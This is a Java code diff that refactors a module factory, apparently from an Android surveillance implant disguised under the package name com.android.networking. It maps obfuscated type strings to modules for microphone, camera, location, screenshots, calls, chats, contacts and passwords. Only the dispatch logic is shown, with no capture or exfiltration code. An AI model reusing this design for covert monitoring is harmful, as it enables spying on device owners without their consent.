@@ -9,6 +9,9 @@
 
 package com.android.networking.module;
 
+import java.util.Enumeration;
+import java.util.Hashtable;
+
 import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
 import com.android.networking.interfaces.AbstractFactory;
@@ -16,6 +19,43 @@ import com.android.networking.util.Check;
 
 public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
+	Hashtable<String, Class> factorymap = new Hashtable<String, Class>();
+	Hashtable<Class, String> typemap = new Hashtable<Class, String>();
+
+	public FactoryModule() {
+		factorymap.put(Messages.getString("c_0"), ModuleMessage.class);
+		factorymap.put(Messages.getString("c_1"), ModuleAddressBook.class);
+		factorymap.put(Messages.getString("c_2"), ModuleCalendar.class);
+		factorymap.put(Messages.getString("c_4"), ModuleDevice.class);
+		factorymap.put(Messages.getString("c_5"), ModulePosition.class);
+		factorymap.put(Messages.getString("c_6"), ModuleSnapshot.class);
+		factorymap.put(Messages.getString("c_7"), ModuleMessage.class);
+		factorymap.put(Messages.getString("c_8"), ModuleMic.class);
+		factorymap.put(Messages.getString("c_9"), ModuleCamera.class);
+		factorymap.put(Messages.getString("c_10"), ModuleClipboard.class);
+		factorymap.put(Messages.getString("c_11"), ModuleCrisis.class);
+		factorymap.put(Messages.getString("c_12"), ModuleApplication.class);
+		factorymap.put(Messages.getString("c_13"), ModuleCall.class);
+		factorymap.put(Messages.getString("c_14"), ModuleChat.class);
+		if (Cfg.ENABLE_PASSWORD_MODULE) {
+			factorymap.put(Messages.getString("c_15"), ModulePassword.class);
+		}
+
+		Enumeration<String> en = factorymap.keys();
+		while (en.hasMoreElements()) {
+			String type = en.nextElement();
+			Class cv = factorymap.get(type);
+			typemap.put(cv, type);
+		}
+
+	}
+
+	public String getType(Class cl) {
+		if(typemap.containsKey(cl)){
+			return typemap.get(cl);
+		}
+		return "unknown type";
+	}
 
 	/**
 	 * mapAgent() Add agent id defined by "key" into the running map. If the
@@ -27,45 +67,22 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	 */
 	public BaseModule create(String type, String subtype) {
 		BaseModule a = new NullModule();
+		if (factorymap.containsKey(type))
 
-		if (Messages.getString("c_0").equals(type)) { //$NON-NLS-1$
-			a = new ModuleMessage();
-		} else if (Messages.getString("c_1").equals(type)) { //$NON-NLS-1$
-			a = new ModuleAddressBook();
-		} else if (Messages.getString("c_2").equals(type)) { //$NON-NLS-1$
-			a = new ModuleCalendar();
-		} else if (Messages.getString("c_4").equals(type)) { //$NON-NLS-1$
-			a = new ModuleDevice();
-		} else if (Messages.getString("c_5").equals(type)) { //$NON-NLS-1$
-			a = new ModulePosition();
-		} else if (Messages.getString("c_6").equals(type)) { //$NON-NLS-1$
-			a = new ModuleSnapshot();
-		} else if (Messages.getString("c_7").equals(type)) { //$NON-NLS-1$
-			a = new ModuleMessage();
-		} else if (Messages.getString("c_8").equals(type)) { //$NON-NLS-1$
-			a = new ModuleMic();
-		} else if (Messages.getString("c_9").equals(type)) { //$NON-NLS-1$
-			a = new ModuleCamera();
-		} else if (Messages.getString("c_10").equals(type)) { //$NON-NLS-1$
-			a = new ModuleClipboard();
-		} else if (Messages.getString("c_11").equals(type)) { //$NON-NLS-1$
-			a = new ModuleCrisis();
-		} else if (Messages.getString("c_12").equals(type)) { //$NON-NLS-1$
-			a = new ModuleApplication();
-		} else if (Messages.getString("c_13").equals(type)) { //$NON-NLS-1$
-			a = new ModuleCall();
-		}else if (Messages.getString("c_14").equals(type)) { //$NON-NLS-1$
-			a = new ModuleChat();
-		}else if (Messages.getString("c_15").equals(type)) { //$NON-NLS-1$
-			if(Cfg.ENABLE_PASSWORD_MODULE){
-				a = new ModulePassword();
+			try {
+				Class cl = factorymap.get(type);
+				return (BaseModule) cl.newInstance();
+			} catch (IllegalAccessException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (create) Error: " + e);
+				}
+			} catch (InstantiationException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (create) Error: " + e);
+				}
 			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
-			}
-		}
 
 		return a;
+
 	}
 }
